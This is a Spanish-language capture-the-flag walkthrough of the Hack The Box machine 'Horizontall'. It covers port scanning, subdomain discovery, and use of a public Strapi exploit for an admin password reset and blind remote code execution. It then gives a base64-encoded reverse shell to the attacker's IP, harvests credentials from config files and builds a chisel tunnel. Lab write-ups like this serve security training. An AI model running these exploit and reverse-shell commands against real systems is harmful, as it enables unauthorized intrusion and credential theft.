# Horizontall

Informacion de la maquina:

- Nombre: Horizontall
- Dificultad: Easy
- SO: Linux
- IP: 10.10.11.105
## Reco

Primero checkeamos la conectividad con la maquina


```
ping -c 1 10.10.11.105
```
```
PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.
64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=155 ms
--- 10.10.11.105 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 154.862/154.862/154.862/0.000 ms
```

A la salida del comando, obtenemos tambien el dato llamado  `ttl` , hace referencia a la **cantidad de tiempo o "saltos" que se ha establecido que un paquete debe existir dentro de una red antes de ser descartado por un enrutador**. Con este mismo dato podemos saber tambien que SO tiene la maquina escaneada

* GNU/Linux  →  TTL=64
- Windows  → TTL=128

Como podemos ver la maquina es una `GNU/Linux`.

Utilizamos la herramienta `nmap`  para reconocer los puertos abiertos

`sudo nmap -sS --min-rate 5000 -vvv -Pn -p- -n 10.10.10.140 -oG openports`

- `-sS`  → Realiza un TCP SYN Scan (requiere SUDO)
- `--min-rate 5000`  → Indica que la cantidad mínima de paquetes a emitir por segundo es 5000
- `-vvv`  →  Indica el nivel de verbose
- `-Pn`  →  Omitir el descubrimiento de hosts Indica que no aplique resolución DNS
- `-p-` →  Indica que escanee el total de los puertos(65535)
- `-n` →  No aplicar resolucion DNS
- `-oG openports`  →  Exporta el output  en un archivo en formato grepeable a un archivo llamado openports

Command output:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 22:41 -03
Initiating SYN Stealth Scan at 22:41
Scanning 10.10.11.105 [65535 ports]
Discovered open port 80/tcp on 10.10.11.105
Discovered open port 22/tcp on 10.10.11.105
Completed SYN Stealth Scan at 22:41, 14.20s elapsed (65535 total ports)
Nmap scan report for 10.10.11.105
Host is up, received user-set (0.16s latency).
Scanned at 2022-08-26 22:41:23 -03 for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Continuamos lanzando un escaneo mas profundo utilizando unos scripts basicos de enumeracion para detectar servicio y version para los puertos abiertos.


```
nmap -sCV -v -p22,80 -Pn 10.10.11.105 -oN target
```

- `-sCV` →  la `-s`  de script scan, `C` para lanzar unos scripts basicos de enumeracion y `V` enumera servicio y version del software que esta corriendo en los puertos. Tambien puede usarse `-sC -sV`
- `-oN targeted`  →  Exporta el output en formato nmap a un archivo llamado targeted

Command output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
|_http-title: horizontall
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos los servicios y versiones en los puertos:

- 22  →  SSH  `OpenSSH 7.6p1`
- 80  →  HTTP  `nginx 1.14.0`

Tambien podes ver en la salida que el sistema operativo es `Ubuntu`.

Agregamos el host horizontall.htb con la ip correspondiente a /etc/hosts

```
echo "10.10.11.105 horizontall.htb" >> /etc/hosts
```

Entramos en la pagina web levanta en el puerto 80 y vemos

![alt text](web.png "Web horizontall.htb")

![[wappalizer.png]]

Inspeccionando un poco la pagina encontramos:

![[devtools web.png]]

Nos traemos el `.js`  y filtramos por algo interesante...

```
curl -s -X GET http://horizontall.htb/js/app.c68eb462.js | grep .htb | less +/.htb
```
Terminando encontrando una direccion URL, esto es conocido como `information leaked`

![[curl al app.js.png]]

Agregamos este nuevo dominio al `/etc/hosts` con

```
echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts
```

Miramos en el browser y vemos:

![[browser reviews.png]]

Fuzzeamos la web desde la raiz con la herramienta `wfuzz` 

```
wfuzz --hc=404 -t 200 -w /usr/share/wordlists/dirb/common.txt  http://api-prod.horizontall.htb/FUZZ
```

- `--hc=404`   →  Filtrar los response de codigo 404
- `-t 200`  →  Usa 200 hilos
- `-w /usr/share/wordlists/dirb/common.txt`  →  el parametro indica el diccionario a utiliizar, en este caso el common.txt que cuenta con 4614 lineas de las mas comunes en webs.
- `http://api-prod.horizontall.htb/FUZZ` →  URL a fuzzear, indicando la posicion a fuzzear con `FUZZ`

comand output:

```
Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                            
=====================================================================

000000001:   200        19 L     33 W       413 Ch      "http://api-prod.horizontall.htb/"                                                                                 
000000288:   200        16 L     101 W      854 Ch      "ADMIN"                                                                                                            
000000286:   200        16 L     101 W      854 Ch      "admin"                                                                                                            
000000287:   200        16 L     101 W      854 Ch      "Admin"                                                                                                            
000001575:   200        0 L      7 W        1150 Ch     "favicon.ico"                                                                                                      
000002020:   200        19 L     33 W       413 Ch      "index.html"                                                                                                       
000003436:   200        3 L      21 W       121 Ch      "robots.txt"                                                                                                       
000003425:   200        0 L      21 W       507 Ch      "reviews"                                                                                                          
000004245:   403        0 L      1 W        60 Ch       "users"                                                                                                            

Total time: 0
Processed Requests: 4614
Filtered Requests: 4605
Requests/sec.: 0

```

 Encontramos un panel de login
 
![[login strapi.png]]

Fuzzeamos ahora sobre el path `admin`

```
wfuzz --hc=404 --hh=854 -t 200 -w /usr/share/wordlists/dirb/common.txt http://api-prod.horizontall.htb/admin/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/admin/FUZZ
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                            
=====================================================================

000002049:   200        0 L      1 W        144 Ch      "init"                                                                                                             
000002253:   200        0 L      1 W        90 Ch       "layout"                                                                                                           
000003003:   403        0 L      1 W        60 Ch       "plugins"                                                                                                          
000003436:   200        3 L      21 W       121 Ch      "robots.txt"                                                                                                       

Total time: 0
Processed Requests: 4614
Filtered Requests: 4610
Requests/sec.: 0
```

`--hh=854`   →  Filtramos por 854 caracteres porque tiraba todo ruido.


En init encontramos la version del software:

![[strapi init.png]]

## Weaponization/Explotacion

Buscamos en `searchsploit`, una herramienta la cual posee una base de datos con los exploits de conocimiento publico de [exploit-db](https://www.exploit-db.com/exploits/50239)

```
searchsploit strapi
```

```
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                              | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                        | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                          | nodejs/webapps/50716.rb
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

revisamos el exploit para ver que hace y encontramos que hace un reinicio de contraseña sobre el usuario admin, probamos el exploit con

```
python3 strapi_exploit.py http://api-prod.horizontall.htb
```

command output

```
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjYxNzE2MzMxLCJleHAiOjE2NjQzMDgzMzF9.PORv1qSxIpZ39BIeztEh21x-p15_IZ1EEGG3Basv3Yk


$> 
```

probamos el comando `id`

```
id
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> 
```

probamos si tenemos conectividad con la maquina tirandonos una traza ICMP a nuestro equipo, para comprobarlo uso la herramienta `tcpdump` en la interfaz de red que comparto con la maquina (la VPN de htb)

```
tcpdump -i tun0 icmp -v
```

tiramos en el exploit un `ping -c 1 <ip>` a la ip que nos provee htb y vemos en el `tcpdum`
que recibimos el paquete que lanzamos.

```
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:57:32.682862 IP (tos 0x0, ttl 63, id 47467, offset 0, flags [DF], proto ICMP (1), length 84)
    horizontall.htb > 4rchSkla3: ICMP echo request, id 11866, seq 1, length 64
16:57:32.682938 IP (tos 0x0, ttl 64, id 60229, offset 0, flags [none], proto ICMP (1), length 84)
    4rchSkla3 > horizontall.htb: ICMP echo reply, id 11866, seq 1, length 64

```

Busco en [revshells](https://www.revshells.com/) una shell que me sirva, la termino encodeando en base64 y me pongo en escucha con `nc` en el puerto 9191 en la maquina atacante 

```
nc -lnvp 9191
```

```
echo 'L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS85MTkxIDA+JjE=' | base64 -d | bash 
```

## Postexplotacion

### tratamiento de la tty

1. `script /dev/null -c bash`
2. `ctrl+z`
3. `stty raw -echo;fg`
4. `reset`
5. `xterm`
6. `export TERM=xterm`
7. `export
8. 
9. SHELL=bash`
10. cambio de proporciones con `stty -a` en la maquina atacante y seteando dichas proporciones en la shell que obtuvimos en el target. en mi caso seria `stty rows 47 columns 180`





### Enumeracion interna
```
uname -a
```

```

Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

Verificamos que estemos en la maquina victima con `ifconfig` (y no en un conteiner)

```
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.105  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:a99c  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:a99c  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:9c  txqueuelen 1000  (Ethernet)
        RX packets 194769  bytes 26271935 (26.2 MB)
        RX errors 0  dropped 39  overruns 0  frame 0
        TX packets 211621  bytes 98825364 (98.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 796981  bytes 127536346 (127.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 796981  bytes 127536346 (127.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

hacemos una busqueda recursiva sobre el directorio ~/myapi/config

```
grep -E "usuario|password" -r
```

- `-E`  →  Permite el uso de regex
- `-r`  →  Hace una busqueda recursiva

y terminamos encontrando unas credenciales `developer : #J!:F9Zt2u`. Las reutilizamos en el ssh pero no sirve.

Escaneo de puertos

Podemos bajar el binario compilado de chisel o compilarlo nosotros mismos con un linkeo estatico de la siguiente manera:

```
go build -ldflags "-s -w -extldflags=-static" -tags osusergo,netgo .
```

